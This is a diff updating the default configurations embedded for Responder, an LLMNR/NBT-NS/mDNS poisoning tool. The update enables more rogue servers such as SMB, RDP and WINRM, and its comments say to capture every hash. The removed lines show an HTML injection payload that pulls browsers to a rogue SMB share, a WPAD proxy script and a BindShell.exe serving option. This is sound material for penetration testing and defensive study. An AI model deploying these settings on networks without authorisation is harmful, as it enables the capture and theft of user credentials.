@@ -3,20 +3,30 @@
 ## Default Responder Configuration
 responder_default_conf = '''[Responder Core]
 
-; Servers to start
-SQL = On
-SMB = On
-Kerberos = On
-FTP = On
-POP = On
-SMTP = On
-IMAP = On
-HTTP = On
-HTTPS = On
-DNS = On
-LDAP = On
+; Poisoners to start
+MDNS  = On
+LLMNR = On
+NBTNS = On
 
-; Custom challenge. 
+; Servers to start
+SQL      = On
+SMB      = On
+RDP      = On
+Kerberos = On
+FTP      = On
+POP      = On
+SMTP     = On
+IMAP     = On
+HTTP     = On
+HTTPS    = On
+DNS      = On
+LDAP     = On
+DCERPC   = On
+WINRM    = On
+SNMP     = Off
+MQTT     = On
+
+; Custom challenge.
 ; Use "Random" for generating a random challenge for each requests (Default)
 Challenge = Random
 
@@ -37,15 +47,17 @@ AnalyzeLog = Analyzer-Session.log
 ResponderConfigDump = Config-Responder.log
 
 ; Specific IP Addresses to respond to (default = All)
-; Example: RespondTo = 10.20.1.100-150, 10.20.3.10
+; Example: RespondTo = 10.20.1.100-150, 10.20.3.10, fe80::e059:5c8f:a486:a4ea-a4ef, 2001:db8::8a2e:370:7334
 RespondTo =
 
 ; Specific NBT-NS/LLMNR names to respond to (default = All)
 ; Example: RespondTo = WPAD, DEV, PROD, SQLINT
+;RespondToName = WPAD, DEV, PROD, SQLINT
 RespondToName = 
 
 ; Specific IP Addresses not to respond to (default = None)
-; Example: DontRespondTo = 10.20.1.100-150, 10.20.3.10
+; Hosts with IPv4 and IPv6 addresses must have both addresses included to prevent responding.
+; Example: DontRespondTo = 10.20.1.100-150, 10.20.3.10, fe80::e059:5c8f:a486:a4ea-a4ef, 2001:db8::8a2e:370:7334
 DontRespondTo = %s
 
 ; Specific NBT-NS/LLMNR names not to respond to (default = None)
@@ -61,8 +73,8 @@ AutoIgnoreAfterSuccess = Off
 ; This may break file serving and is useful only for hash capture
 CaptureMultipleCredentials = On
 
-; If set to On, we will write to file all hashes captured from the same host. 
-; In this case, Responder will log from 172.16.0.12 all user hashes: domain	oto, 
+; If set to On, we will write to file all hashes captured from the same host.
+; In this case, Responder will log from 172.16.0.12 all user hashes: domain\toto,
 ; domain\popo, domain\zozo. Recommended value: On, capture everything.
 CaptureMultipleHashFromSameHost = On
 
@@ -82,18 +94,18 @@ Serve-Html = Off
 HtmlFilename = files/AccessDenied.html
 
 ; Custom EXE File to serve
-ExeFilename = files/BindShell.exe
+ExeFilename = ;files/filetoserve.exe
 
 ; Name of the downloaded .exe that the client will see
 ExeDownloadName = ProxyClient.exe
 
 ; Custom WPAD Script
-WPADScript = function FindProxyForURL(url, host){if ((host == "localhost") || shExpMatch(host, "localhost.*") ||(host == "127.0.0.1") || isPlainHostName(host)) return "DIRECT"; if (dnsDomainIs(host, "ProxySrv")||shExpMatch(host, "(*.ProxySrv|ProxySrv)")) return "DIRECT"; return 'PROXY ProxySrv:3128; PROXY ProxySrv:3141; DIRECT';}
+; Only set one if you really know what you're doing. Responder is taking care of that and inject the right one, with your current IP address.
+WPADScript =
 
 ; HTML answer to inject in HTTP responses (before </body> tag).
-; Set to an empty string to disable.
-; In this example, we redirect make users' browsers issue a request to our rogue SMB server.
-HTMLToInject = <img src='file://RespProxySrv/pictures/logo.jpg' alt='Loading' height='1' width='1'>
+; leave empty if you want to use the default one (redirect to SMB on your IP address).
+HTMLToInject =
 
 [HTTPS Server]
 
@@ -106,20 +118,30 @@ SSLKey = certs/responder.key
 # Disable Responder's HTTP services by default
 responder_no_http_conf = '''[Responder Core]
 
-; Servers to start
-SQL = On
-SMB = On
-Kerberos = On
-FTP = On
-POP = On
-SMTP = On
-IMAP = On
-HTTP = On
-HTTPS = On
-DNS = On
-LDAP = On
+; Poisoners to start
+MDNS  = On
+LLMNR = On
+NBTNS = On
 
-; Custom challenge. 
+; Servers to start
+SQL      = On
+SMB      = On
+RDP      = On
+Kerberos = On
+FTP      = On
+POP      = On
+SMTP     = On
+IMAP     = On
+HTTP     = Off
+HTTPS    = Off
+DNS      = On
+LDAP     = On
+DCERPC   = On
+WINRM    = On
+SNMP     = Off
+MQTT     = On
+
+; Custom challenge.
 ; Use "Random" for generating a random challenge for each requests (Default)
 Challenge = Random
 
@@ -140,15 +162,17 @@ AnalyzeLog = Analyzer-Session.log
 ResponderConfigDump = Config-Responder.log
 
 ; Specific IP Addresses to respond to (default = All)
-; Example: RespondTo = 10.20.1.100-150, 10.20.3.10
+; Example: RespondTo = 10.20.1.100-150, 10.20.3.10, fe80::e059:5c8f:a486:a4ea-a4ef, 2001:db8::8a2e:370:7334
 RespondTo =
 
 ; Specific NBT-NS/LLMNR names to respond to (default = All)
 ; Example: RespondTo = WPAD, DEV, PROD, SQLINT
+;RespondToName = WPAD, DEV, PROD, SQLINT
 RespondToName = 
 
 ; Specific IP Addresses not to respond to (default = None)
-; Example: DontRespondTo = 10.20.1.100-150, 10.20.3.10
+; Hosts with IPv4 and IPv6 addresses must have both addresses included to prevent responding.
+; Example: DontRespondTo = 10.20.1.100-150, 10.20.3.10, fe80::e059:5c8f:a486:a4ea-a4ef, 2001:db8::8a2e:370:7334
 DontRespondTo = %s
 
 ; Specific NBT-NS/LLMNR names not to respond to (default = None)
@@ -164,8 +188,8 @@ AutoIgnoreAfterSuccess = Off
 ; This may break file serving and is useful only for hash capture
 CaptureMultipleCredentials = On
 
-; If set to On, we will write to file all hashes captured from the same host. 
-; In this case, Responder will log from 172.16.0.12 all user hashes: domain	oto, 
+; If set to On, we will write to file all hashes captured from the same host.
+; In this case, Responder will log from 172.16.0.12 all user hashes: domain\toto,
 ; domain\popo, domain\zozo. Recommended value: On, capture everything.
 CaptureMultipleHashFromSameHost = On
 
@@ -185,18 +209,18 @@ Serve-Html = Off
 HtmlFilename = files/AccessDenied.html
 
 ; Custom EXE File to serve
-ExeFilename = files/BindShell.exe
+ExeFilename = ;files/filetoserve.exe
 
 ; Name of the downloaded .exe that the client will see
 ExeDownloadName = ProxyClient.exe
 
 ; Custom WPAD Script
-WPADScript = function FindProxyForURL(url, host){if ((host == "localhost") || shExpMatch(host, "localhost.*") ||(host == "127.0.0.1") || isPlainHostName(host)) return "DIRECT"; if (dnsDomainIs(host, "ProxySrv")||shExpMatch(host, "(*.ProxySrv|ProxySrv)")) return "DIRECT"; return 'PROXY ProxySrv:3128; PROXY ProxySrv:3141; DIRECT';}
+; Only set one if you really know what you're doing. Responder is taking care of that and inject the right one, with your current IP address.
+WPADScript =
 
 ; HTML answer to inject in HTTP responses (before </body> tag).
-; Set to an empty string to disable.
-; In this example, we redirect make users' browsers issue a request to our rogue SMB server.
-HTMLToInject = <img src='file://RespProxySrv/pictures/logo.jpg' alt='Loading' height='1' width='1'>
+; leave empty if you want to use the default one (redirect to SMB on your IP address).
+HTMLToInject =
 
 [HTTPS Server]
 
